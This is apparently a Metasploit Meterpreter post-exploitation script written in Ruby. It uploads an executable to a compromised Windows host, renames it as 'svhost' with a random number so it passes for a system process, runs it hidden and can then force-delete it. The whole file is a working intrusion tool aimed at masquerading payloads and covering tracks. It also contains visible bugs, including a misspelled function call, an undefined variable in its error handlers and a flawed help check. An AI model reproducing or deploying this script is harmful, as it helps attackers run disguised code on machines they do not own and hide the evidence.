session = client
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu."                        ],
	"-e" => [ true, "Executable or script to upload to target host."],
	"-o" => [ true,"Options for executable."],
	"-p" => [ false,"Path on target where to upload executable if none given %TEMP% directory will be used."],
        "-v" => [ false,"Verbose, return output of execution of uploaded executable."],
        "-r" => [ false,"Remove executable after running by deleting it of the file system."]
)
################## function declaration Declarations ##################
def usage()
	print(
		"Uploadexec Meterpreter Script\n" +
		  "It has the functionality to upload a desired executable or script and execute\n"+
		  "the file uploaded"
	)
	puts "\n\t-h \t\tHelp menu."
	puts "\t-e <opt> \tExecutable or script to upload to target host"
	puts "\t-o <opt> \tOptions for executable"
	puts "\t-p <opt> \tPath on target where to upload executable if none given %TEMP% directory will be used"
        puts "\t-v       \tVerbose, return output of execution of uploaded executable."
        puts "\t-r       \tRemove executable after running by deleting it of the file system."

end
def upload(session,file,trgloc = "")
        if not ::File.exists?(file)
                raise "File to Upload does not exists!"
        else
                if trgloc == ""
                location = session.fs.file.expand_path("%TEMP%")
                else
                        location = trgloc
                end
                begin
			ext = file.scan(/\S*(.exe)/i)
            		if ext.join == ".exe"
                                fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
                        else
                                fileontrgt = "#{location}\\TMP#{rand(100)}#{ext}"
                        end
                        print_status("\tUploading #{file}....")
                        session.fs.file.upload_file("#{fileontrgt}","#{file}")
                        print_status("\t#{file} uploaded!")
                        print_status("\tUploaded as #{fileontrgt}")
                rescue ::Exception => e
                        print_status("Error uploading file #{file}: #{e.class} #{e}")
                end
        end
        return fileontrgt
end
#Function for executing a list of commands
def cmd_exec(session,cmdexe,opt,verbose)
	r=''
	session.response_timeout=120
	if verbose == 1
		begin
			print_status "\tRunning command #{cmdexe}"
			r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => true})
			while(d = r.channel.read)

				prin_status("\t#{d}")
			end
			r.channel.close
			r.close
		rescue ::Exception => e
			print_status("Error Running Command #{cmd}: #{e.class} #{e}")
		end
	else
		begin
                        print_status "\trunning command #{cmdexe}"
                        r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
                        r.close
                rescue ::Exception => e
                        print_status("Error Running Command #{cmd}: #{e.class} #{e}")
                end
	end
end
def m_unlink(session, path)
	r = session.sys.process.execute("cmd.exe /c del /F /S /Q " + path, nil, {'Hidden' => 'true'})
	while(r.name)
		select(nil, nil, nil, 0.10)
	end
	r.close
end
#parsing of Options
file = ""
cmdopt = ""
helpcall = 0
path = ""
verbose = 0
remove = 0
@@exec_opts.parse(args) { |opt, idx, val|
	case opt

	when "-e"
		file = val
	when "-o"
		cmdopt = val
	when "-p"
		path = val
        when "-v"
                verbose = 1
	when "-h"
		helpcall = 1
        when "-r"
		remove = 1
	end

}
if args.length != 0 or helpcall != 0
        print_status("Running Upload and Execute Meterpreter script....")
	exec = upload(session,file,path)
	cmd_exec(session,exec,cmdopt,verbose)
        if remove == 1
                print_status("\tDeleting #{exec}")
                m_unlink(session, exec)
        end
        print_status("Finnished!")
else
	usage()
end
